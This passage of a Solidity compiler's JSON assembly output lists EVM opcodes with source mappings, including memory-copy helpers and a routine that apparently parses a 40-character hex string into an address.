											"begin": 36,
											"end": 189,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 182,
											"end": 185,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 176,
											"end": 186,
											"name": "MLOAD",
											"source": -1
										},
										{
											"begin": 171,
											"end": 174,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 164,
											"end": 187,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 98,
											"end": 100,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 93,
											"end": 96,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 89,
											"end": 101,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 82,
											"end": 101,
											"name": "SWAP2",
											"source": -1
										},
										{
											"begin": 82,
											"end": 101,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 123,
											"end": 125,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 118,
											"end": 121,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 114,
											"end": 126,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 107,
											"end": 126,
											"name": "SWAP1",
											"source": -1
										},
										{
											"begin": 107,
											"end": 126,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 148,
											"end": 150,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 143,
											"end": 146,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 139,
											"end": 151,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 132,
											"end": 151,
											"name": "SWAP3",
											"source": -1
										},
										{
											"begin": 132,
											"end": 151,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 36,
											"end": 189,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "90"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMP",
											"source": -1
										},
										{
											"begin": 36,
											"end": 189,
											"name": "tag",
											"source": -1,
											"value": "92"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 274,
											"end": 275,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": 267,
											"end": 270,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 263,
											"end": 265,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 259,
											"end": 271,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 254,
											"end": 257,
											"name": "PUSH",
											"source": -1,
											"value": "100"
										},
										{
											"begin": 250,
											"end": 272,
											"name": "EXP",
											"source": -1
										},
										{
											"begin": 246,
											"end": 276,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 315,
											"end": 319,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 311,
											"end": 320,
											"name": "NOT",
											"source": -1
										},
										{
											"begin": 305,
											"end": 308,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 299,
											"end": 309,
											"name": "MLOAD",
											"source": -1
										},
										{
											"begin": 295,
											"end": 321,
											"name": "AND",
											"source": -1
										},
										{
											"begin": 356,
											"end": 360,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 350,
											"end": 353,
											"name": "DUP5",
											"source": -1
										},
										{
											"begin": 344,
											"end": 354,
											"name": "MLOAD",
											"source": -1
										},
										{
											"begin": 340,
											"end": 361,
											"name": "AND",
											"source": -1
										},
										{
											"begin": 389,
											"end": 396,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 380,
											"end": 387,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 377,
											"end": 397,
											"name": "OR",
											"source": -1
										},
										{
											"begin": 372,
											"end": 375,
											"name": "DUP6",
											"source": -1
										},
										{
											"begin": 365,
											"end": 398,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 3,
											"end": 402,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 3,
											"end": 402,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 3,
											"end": 402,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 36,
											"end": 189,
											"name": "tag",
											"source": -1,
											"value": "93"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 66,
											"end": 68,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 61,
											"end": 64,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 58,
											"end": 69,
											"name": "LT",
											"source": -1
										},
										{
											"begin": 36,
											"end": 189,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "95"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 182,
											"end": 185,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 176,
											"end": 186,
											"name": "MLOAD",
											"source": -1
										},
										{
											"begin": 171,
											"end": 174,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 164,
											"end": 187,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 98,
											"end": 100,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 93,
											"end": 96,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 89,
											"end": 101,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 82,
											"end": 101,
											"name": "SWAP2",
											"source": -1
										},
										{
											"begin": 82,
											"end": 101,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 123,
											"end": 125,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 118,
											"end": 121,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 114,
											"end": 126,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 107,
											"end": 126,
											"name": "SWAP1",
											"source": -1
										},
										{
											"begin": 107,
											"end": 126,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 148,
											"end": 150,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 143,
											"end": 146,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 139,
											"end": 151,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 132,
											"end": 151,
											"name": "SWAP3",
											"source": -1
										},
										{
											"begin": 132,
											"end": 151,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 36,
											"end": 189,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "93"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMP",
											"source": -1
										},
										{
											"begin": 36,
											"end": 189,
											"name": "tag",
											"source": -1,
											"value": "95"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 274,
											"end": 275,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": 267,
											"end": 270,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 263,
											"end": 265,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 259,
											"end": 271,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 254,
											"end": 257,
											"name": "PUSH",
											"source": -1,
											"value": "100"
										},
										{
											"begin": 250,
											"end": 272,
											"name": "EXP",
											"source": -1
										},
										{
											"begin": 246,
											"end": 276,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 315,
											"end": 319,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 311,
											"end": 320,
											"name": "NOT",
											"source": -1
										},
										{
											"begin": 305,
											"end": 308,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 299,
											"end": 309,
											"name": "MLOAD",
											"source": -1
										},
										{
											"begin": 295,
											"end": 321,
											"name": "AND",
											"source": -1
										},
										{
											"begin": 356,
											"end": 360,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 350,
											"end": 353,
											"name": "DUP5",
											"source": -1
										},
										{
											"begin": 344,
											"end": 354,
											"name": "MLOAD",
											"source": -1
										},
										{
											"begin": 340,
											"end": 361,
											"name": "AND",
											"source": -1
										},
										{
											"begin": 389,
											"end": 396,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 380,
											"end": 387,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 377,
											"end": 397,
											"name": "OR",
											"source": -1
										},
										{
											"begin": 372,
											"end": 375,
											"name": "DUP6",
											"source": -1
										},
										{
											"begin": 365,
											"end": 398,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 3,
											"end": 402,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 3,
											"end": 402,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 3,
											"end": 402,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "SWAP5",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "PUSH",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 49,
											"end": 53,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 39,
											"end": 46,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 30,
											"end": 37,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 26,
											"end": 47,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 22,
											"end": 54,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 13,
											"end": 20,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 6,
											"end": 55,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "PUSH",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 7427,
											"end": 7506,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 7413,
											"end": 7507,
											"name": "SWAP5",
											"source": 3
										},
										{
											"begin": 7413,
											"end": 7507,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7413,
											"end": 7507,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7413,
											"end": 7507,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7413,
											"end": 7507,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7413,
											"end": 7507,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7130,
											"end": 7512,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 7130,
											"end": 7512,
											"name": "JUMP",
											"source": 3,
											"value": "[out]"
										},
										{
											"begin": 3573,
											"end": 4296,
											"name": "tag",
											"source": 3,
											"value": "37"
										},
										{
											"begin": 3573,
											"end": 4296,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 3640,
											"end": 3662,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 3669,
											"end": 3685,
											"name": "PUSH",
											"source": 3,
											"value": "60"
										},
										{
											"begin": 3694,
											"end": 3696,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 3669,
											"end": 3697,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 3669,
											"end": 3697,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 3702,
											"end": 3715,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 3718,
											"end": 3719,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 3702,
											"end": 3719,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 3702,
											"end": 3719,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 3724,
											"end": 3734,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 3739,
											"end": 3749,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 3759,
											"end": 3765,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 3768,
											"end": 3769,
											"name": "PUSH",
											"source": 3,
											"value": "2"
										},
										{
											"begin": 3759,
											"end": 3769,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 3759,
											"end": 3769,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 3754,
											"end": 4266,
											"name": "tag",
											"source": 3,
											"value": "97"
										},
										{
											"begin": 3754,
											"end": 4266,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 3775,
											"end": 3785,
											"name": "PUSH",
											"source": 3,
											"value": "2A"
										},
										{
											"begin": 3771,
											"end": 3772,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 3771,
											"end": 3785,
											"name": "LT",
											"source": 3
										},
										{
											"begin": 3754,
											"end": 4266,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 3754,
											"end": 4266,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "98"
										},
										{
											"begin": 3754,
											"end": 4266,
											"name": "JUMPI",
											"source": 3
										},
										{
											"begin": 3810,
											"end": 3813,
											"name": "PUSH",
											"source": 3,
											"value": "100"
										},
										{
											"begin": 3801,
											"end": 3813,
											"name": "DUP5",
											"source": 3
										},
										{
											"begin": 3801,
											"end": 3813,
											"name": "MUL",
											"source": 3
										},
										{
											"begin": 3801,
											"end": 3813,
											"name": "SWAP4",
											"source": 3
										},
										{
											"begin": 3801,
											"end": 3813,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 3838,
											"end": 3841,
											"name": "DUP5",
											"source": 3
										},
										{
											"begin": 3842,
											"end": 3843,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 3838,
											"end": 3844,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 3838,
											"end": 3844,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 3838,
											"end": 3844,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 3838,
											"end": 3844,
											"name": "LT",
											"source": 3
										},
										{
											"begin": 3838,
											"end": 3844,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "100"
										},
										{
											"begin": 3838,
											"end": 3844,
											"name": "JUMPI",
											"source": 3
										},
										{
											"begin": 3838,
											"end": 3844,
											"name": "INVALID",
											"source": 3
										},
										{
											"begin": 3838,
											"end": 3844,
											"name": "tag",
											"source": 3,
											"value": "100"
										},
										{
											"begin": 3838,
											"end": 3844,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 3838,
											"end": 3844,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 3838,
											"end": 3844,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 3838,
											"end": 3844,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 3838,
											"end": 3844,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 3838,
											"end": 3844,
											"name": "PUSH",
											"source": 3,
											"value": "F8"
										},
										{
											"begin": 3838,
											"end": 3844,
											"name": "SHR",
											"source": 3
										},
										{
											"begin": 3838,
											"end": 3844,
											"name": "PUSH",
											"source": 3,
											"value": "F8"
										},
										{
											"begin": 3838,
											"end": 3844,
											"name": "SHL",
											"source": 3
										},
										{
											"begin": 3832,
											"end": 3845,
											"name": "PUSH",
											"source": 3,
											"value": "F8"
										},
										{
											"begin": 3832,
											"end": 3845,
											"name": "SHR",
											"source": 3
										},
										{
											"begin": 3824,
											"end": 3846,
											"name": "PUSH",
											"source": 3,
											"value": "FF"
										},
										{
											"begin": 3824,
											"end": 3846,
											"name": "AND",
											"source": 3
										},
										{
											"begin": 3819,
											"end": 3846,
											"name": "SWAP3",
											"source": 3
										},
										{
											"begin": 3819,
											"end": 3846,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 3871,
											"end": 3874,
											"name": "DUP5",
											"source": 3
										},
										{
											"begin": 3879,
											"end": 3880,
											"name": "PUSH",
											"source": 3,
											"value": "1"
										},
										{
											"begin": 3875,
											"end": 3876,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 3875,
											"end": 3880,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 3871,
											"end": 3881,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 3871,
											"end": 3881,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 3871,
											"end": 3881,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 3871,
											"end": 3881,
											"name": "LT",
											"source": 3
										},
										{
											"begin": 3871,
											"end": 3881,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "101"
										},
										{
											"begin": 3871,
											"end": 3881,
											"name": "JUMPI",
											"source": 3
										},
										{
											"begin": 3871,
											"end": 3881,
											"name": "INVALID",
											"source": 3
										},
										{
											"begin": 3871,
											"end": 3881,
											"name": "tag",
											"source": 3,
											"value": "101"
										},
										{
											"begin": 3871,
											"end": 3881,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 3871,
											"end": 3881,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 3871,
											"end": 3881,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 3871,
											"end": 3881,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 3871,
											"end": 3881,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 3871,
											"end": 3881,
											"name": "PUSH",
											"source": 3,
											"value": "F8"
										},
										{
											"begin": 3871,
											"end": 3881,
											"name": "SHR",
											"source": 3
										},
										{
											"begin": 3871,
											"end": 3881,
											"name": "PUSH",
											"source": 3,
											"value": "F8"
										},
										{
											"begin": 3871,
											"end": 3881,
											"name": "SHL",
											"source": 3
										},
										{
											"begin": 3865,
											"end": 3882,
											"name": "PUSH",
											"source": 3,
											"value": "F8"
										},
										{
											"begin": 3865,
											"end": 3882,
											"name": "SHR",
											"source": 3
										},
										{
											"begin": 3857,
											"end": 3883,
											"name": "PUSH",
											"source": 3,
											"value": "FF"
										},
										{
											"begin": 3857,
											"end": 3883,
											"name": "AND",
											"source": 3
										},
										{
											"begin": 3852,
											"end": 3883,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 3852,
											"end": 3883,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 3900,
											"end": 3902,
											"name": "PUSH",
											"source": 3,
											"value": "61"
										},
										{
											"begin": 3894,
											"end": 3896,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 3894,
											"end": 3902,
											"name": "PUSH",
											"source": 3,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 3894,
											"end": 3902,
											"name": "AND",
											"source": 3
										},
										{
											"begin": 3894,
											"end": 3902,
											"name": "LT",
											"source": 3
										},
										{
											"begin": 3894,
											"end": 3902,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 3893,
											"end": 3918,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 3893,
											"end": 3918,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 3893,
											"end": 3918,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "102"
										},
										{
											"begin": 3893,
											"end": 3918,
											"name": "JUMPI",
											"source": 3
										},
										{
											"begin": 3893,
											"end": 3918,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 3914,
											"end": 3917,
											"name": "PUSH",
											"source": 3,
											"value": "66"
										},
										{
											"begin": 3908,
											"end": 3910,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 3908,
											"end": 3917,
											"name": "PUSH",
											"source": 3,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 3908,
											"end": 3917,
											"name": "AND",
											"source": 3
										},
										{
											"begin": 3908,
											"end": 3917,
											"name": "GT",
											"source": 3
										},
										{
											"begin": 3908,
											"end": 3917,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 3893,
											"end": 3918,
											"name": "tag",
											"source": 3,
											"value": "102"
										},
										{
											"begin": 3893,
											"end": 3918,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 3889,
											"end": 4058,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 3889,
											"end": 4058,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "103"
										},
										{
											"begin": 3889,
											"end": 4058,
											"name": "JUMPI",
											"source": 3
										},
										{
											"begin": 3933,
											"end": 3935,
											"name": "PUSH",
											"source": 3,
											"value": "57"
										},
										{
											"begin": 3927,
											"end": 3935,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 3927,
											"end": 3935,
											"name": "SUB",
											"source": 3
										},
										{
											"begin": 3927,
											"end": 3935,
											"name": "SWAP3",
											"source": 3
										},
										{
											"begin": 3927,
											"end": 3935,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 3889,
											"end": 4058,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "104"
										},
										{
											"begin": 3889,
											"end": 4058,
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 3889,
											"end": 4058,
											"name": "tag",
											"source": 3,
											"value": "103"
										},
										{
											"begin": 3889,
											"end": 4058,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 3959,
											"end": 3961,
											"name": "PUSH",
											"source": 3,
											"value": "41"
										},
										{
											"begin": 3953,
											"end": 3955,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 3953,
											"end": 3961,
											"name": "PUSH",
											"source": 3,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 3953,
											"end": 3961,
											"name": "AND",
											"source": 3
										},
										{
											"begin": 3953,
											"end": 3961,
											"name": "LT",
											"source": 3
										},
										{
											"begin": 3953,
											"end": 3961,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 3952,
											"end": 3976,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 3952,
											"end": 3976,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 3952,
											"end": 3976,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "105"
										},
										{
											"begin": 3952,
											"end": 3976,
											"name": "JUMPI",
											"source": 3
										},
										{
											"begin": 3952,
											"end": 3976,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 3973,
											"end": 3975,
											"name": "PUSH",
											"source": 3,
											"value": "46"
										},
										{
											"begin": 3967,
											"end": 3969,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 3967,
											"end": 3975,
											"name": "PUSH",
											"source": 3,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 3967,
											"end": 3975,
											"name": "AND",
											"source": 3
										},
										{
											"begin": 3967,
											"end": 3975,
											"name": "GT",
											"source": 3
										},
										{
											"begin": 3967,
											"end": 3975,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 3952,
											"end": 3976,
											"name": "tag",
											"source": 3,
											"value": "105"
										},
										{
											"begin": 3952,
											"end": 3976,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 3948,
											"end": 4058,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 3948,
											"end": 4058,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "106"
										},
										{
											"begin": 3948,
											"end": 4058,
											"name": "JUMPI",
											"source": 3
										},
										{
											"begin": 3991,
											"end": 3993,
											"name": "PUSH",
											"source": 3,
											"value": "37"
										},
										{
											"begin": 3985,
											"end": 3993,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 3985,
											"end": 3993,
											"name": "SUB",
											"source": 3
										},
										{
											"begin": 3985,
											"end": 3993,
											"name": "SWAP3",
											"source": 3
										},
										{
											"begin": 3985,
											"end": 3993,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 3948,
											"end": 4058,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "107"
										},
										{
											"begin": 3948,
											"end": 4058,
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 3948,
											"end": 4058,
											"name": "tag",
											"source": 3,
											"value": "106"
										},
										{
											"begin": 3948,
											"end": 4058,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 4017,
											"end": 4019,
											"name": "PUSH",
											"source": 3,
											"value": "30"
										},
										{
											"begin": 4011,
											"end": 4013,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 4011,
											"end": 4019,
											"name": "PUSH",
											"source": 3,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 4011,
											"end": 4019,
											"name": "AND",
											"source": 3
										},
										{
											"begin": 4011,
											"end": 4019,
											"name": "LT",
											"source": 3
										},
										{
											"begin": 4011,
											"end": 4019,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 4010,
											"end": 4034,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 4010,
											"end": 4034,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 4010,
											"end": 4034,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "108"
										},
										{
											"begin": 4010,
											"end": 4034,
											"name": "JUMPI",
											"source": 3
										},
										{
											"begin": 4010,
											"end": 4034,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 4031,
											"end": 4033,
											"name": "PUSH",
											"source": 3,
											"value": "39"
										},
										{
											"begin": 4025,
											"end": 4027,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 4025,
											"end": 4033,
											"name": "PUSH",
											"source": 3,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 4025,
											"end": 4033,
											"name": "AND",
											"source": 3
										},
										{
											"begin": 4025,
											"end": 4033,
											"name": "GT",
											"source": 3
										},
										{
											"begin": 4025,
											"end": 4033,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 4010,
											"end": 4034,
											"name": "tag",
											"source": 3,
											"value": "108"
										},
										{
											"begin": 4010,
											"end": 4034,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 4006,
											"end": 4058,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 4006,
											"end": 4058,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "109"
										},
										{
											"begin": 4006,
											"end": 4058,
											"name": "JUMPI",
											"source": 3
										},
										{
											"begin": 4049,
											"end": 4051,
											"name": "PUSH",
											"source": 3,
											"value": "30"
										},
										{
											"begin": 4043,
											"end": 4051,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 4043,
											"end": 4051,
											"name": "SUB",
											"source": 3
										},
										{
											"begin": 4043,
											"end": 4051,
											"name": "SWAP3",
											"source": 3
										},
										{
											"begin": 4043,
											"end": 4051,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 4006,
											"end": 4058,
											"name": "tag",
											"source": 3,
											"value": "109"
										},
										{
											"begin": 4006,
											"end": 4058,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 3948,
											"end": 4058,
											"name": "tag",
											"source": 3,
											"value": "107"
										},
										{
											"begin": 3948,
											"end": 4058,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 3889,
											"end": 4058,
											"name": "tag",
											"source": 3,
											"value": "104"
										},
										{
											"begin": 3889,
											"end": 4058,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 4074,
											"end": 4076,
											"name": "PUSH",
											"source": 3,
											"value": "61"
										},
										{
											"begin": 4068,
											"end": 4070,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 4068,
											"end": 4076,
											"name": "PUSH",
											"source": 3,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 4068,
											"end": 4076,
